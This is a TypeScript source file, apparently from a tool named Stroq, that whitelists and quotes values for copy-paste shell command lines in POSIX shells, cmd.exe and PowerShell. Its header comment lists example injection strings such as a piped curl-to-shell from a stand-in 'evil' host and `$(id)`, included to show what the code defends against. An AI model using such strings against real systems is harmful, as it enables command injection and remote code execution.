// Command lines that Stroq prints for a person to copy and paste.
//
// A name, a path, a source or an id in such a line comes from a package, a skill, a lock or a config that somebody
// else wrote, so it must never become a second command when it is pasted: `x; curl evil | sh`, `$(id)`, a backtick,
// a quote, a newline, `&`, `%PATH%`, `^`. Shells differ in what they do with a quote (fish reads a backslash inside
// single quotes, csh and tcsh expand `!` inside them, `$'...'` is not POSIX), so there is no clever quoting here. It
// is a whitelist, and what is not on it is not printed as a command at all:
//
// - POSIX shells. A value is written bare only if every character is one of `A-Za-z0-9_@%+=:,./-` and it does not
//   begin with `-`, `=` or `%` (an option, zsh's `=cmd`, fish's `%self`). Otherwise it is written between single
//   quotes, but only if it has no `'`, no backslash, no `!`, no control character (newline, NUL and DEL among them),
//   no U+2028, U+2029 or U+0085, and no character that is invisible, reverses the text or is a lone surrogate. Any other
//   value (and any longer than 4096 characters) is not quoted: see below.
// - Windows (cmd.exe and PowerShell). A value is written bare on the same terms (it may also hold a backslash), or
//   between double quotes if it has no `"`, `%`, `^`, `!`, `&`, `|`, `<`, `>`, backtick or `$`, no control or hidden
//   character, and does not end with a backslash. Nothing else is printed as a command. The lines are for cmd.exe
//   and PowerShell; no other shell on Windows is quoted for.
// - A value that cannot be written that way makes the whole line a plain sentence that says so, in letters, spaces,
//   commas and periods only, so that nothing in it means anything to a shell. There is no placeholder inside a command
//   line: a placeholder is text, and `<` and `>` are redirections.
// - A positional that begins with `-` would be read as an option, so the line puts `--` before every positional, and
//   an option's value that begins with `-` is written `--flag=value`.

/** What a value is, for the sentence that says it cannot be printed. */
export type Kind = 'name' | 'path' | 'source' | 'id' | 'value';

/** The most a value may have before it is not printed: longer than any path, so a hostile one cannot flood a line. */
const MAX_UNITS = 4096;

/** Characters that cannot be shown as they are: controls (DEL and U+0085 too), what shows nothing or changes what is shown. */
const UNSHOWABLE = /[\p{Cc}\p{Cf}\p{Cs}\p{Zl}\p{Zp}\p{Default_Ignorable_Code_Point}]/u;
/** A word of a POSIX shell that is not quoted: nothing in it means anything to a shell, and it is not an option. */
const BARE_POSIX = /^[A-Za-z0-9_@+:,./][A-Za-z0-9_@%+=:,./-]*$/;
/** The same for Windows, where a backslash is a path separator. */
const BARE_WINDOWS = /^[A-Za-z0-9_@+:,./\\][A-Za-z0-9_@+=:,./\\-]*$/;
/** What a POSIX single quote cannot hold in every shell: the quote, a backslash (fish) and `!` (csh, tcsh). */
const NOT_IN_SINGLE_QUOTES = /['\\!]/;
/** What cmd.exe or PowerShell acts on even between double quotes (or that ends the quote). */
const NOT_IN_DOUBLE_QUOTES = /["%^!&|<>`$]/;

/**
 * One value as one word of a command line, or null when it cannot be written as one on this platform in a way that
 * is the same in every shell the line may be pasted into. The words are never altered; a value is whole or absent.
 */
export function quoteWord(
  value: string,
  platform: NodeJS.Platform = process.platform,
  forbid = '',
): string | null {
  if (value.length > MAX_UNITS || UNSHOWABLE.test(value)) return null;
  if ([...forbid].some((char) => value.includes(char))) return null;
  if (platform !== 'win32') {
    if (BARE_POSIX.test(value)) return value;
    return NOT_IN_SINGLE_QUOTES.test(value) ? null : `'${value}'`;
  }
  if (BARE_WINDOWS.test(value)) return value;
  return NOT_IN_DOUBLE_QUOTES.test(value) || value.endsWith('\\') ? null : `"${value}"`;
}

/** What a piece of a command line is. A string is a word that Stroq wrote; the others are values from outside. */
export type Piece =
  | string
  /** A positional argument. */
  | { readonly positional: string; readonly what?: Kind }
  /** An option with a value: `--flag value`. */
  | { readonly flag: string; readonly value: string; readonly what?: Kind }
  /** A word in a place that is already past `--`, so that it is never read as an option. */
  | { readonly word: string; readonly what?: Kind };

export interface LineOptions {
  readonly platform?: NodeJS.Platform;
  /** Characters that make a value unprintable, for a line that goes into text where they mean something (a backtick in Markdown). */
  readonly forbid?: string;
}

/** The place of a positional in the words of a line, until it is known whether they all stay where they are. */
const HOLE = Symbol('positional');

/**
 * The command line of the pieces with every value quoted, in the order given, or null when a value cannot be printed
 * safely; `unprintable` then names what kind of value it was.
 */
export function tryCommandLine(
  pieces: readonly Piece[],
  options: LineOptions = {},
): { readonly line: string } | { readonly line: null; readonly unprintable: Kind } {
  const { platform = process.platform, forbid = '' } = options;
  const words: (string | typeof HOLE)[] = [];
  const positionals: string[] = [];
  let leadingDash = false;
  const unprintable = (what: Kind | undefined) =>
    ({ line: null, unprintable: what ?? 'value' }) as const;
  for (const piece of pieces) {
    if (typeof piece === 'string') {
      words.push(piece);
      continue;
    }
    const value = 'flag' in piece ? piece.value : 'word' in piece ? piece.word : piece.positional;
    const word = quoteWord(value, platform, forbid);
    if (word === null) return unprintable(piece.what);
    if ('flag' in piece) {
      if (value.startsWith('-')) words.push(`${piece.flag}=${word}`);
      else words.push(piece.flag, word);
    } else if ('word' in piece) words.push(word);
    else {
      leadingDash ||= value.startsWith('-');
      positionals.push(word);
      words.push(HOLE);
    }
  }
  // A positional stays where it was written, unless one starts with `-`: then all of them go after `--`.
  if (leadingDash)
    return { line: [...words.filter((word) => word !== HOLE), '--', ...positionals].join(' ') };
  let next = 0;
  return { line: words.map((word) => (word === HOLE ? positionals[next++]! : word)).join(' ') };
}

/** What a person is told in place of a command that cannot be printed safely: letters, spaces, commas and periods. */
export function unprintableSentence(what: Kind = 'value'): string {
  const hint =
    what === 'name'
      ? ', and stroq doctor lists the installed names'
      : what === 'id'
        ? ', and stroq log lists the sessions'
        : '';
  return `the ${what} has characters that cannot be quoted safely for a shell, so no command is shown${hint}`;
}

/** The command line of the pieces, or the sentence that says why there is none. */
export function commandLine(pieces: readonly Piece[], options: LineOptions = {}): string {
  const result = tryCommandLine(pieces, options);
  return result.line ?? unprintableSentence(result.unprintable);
}
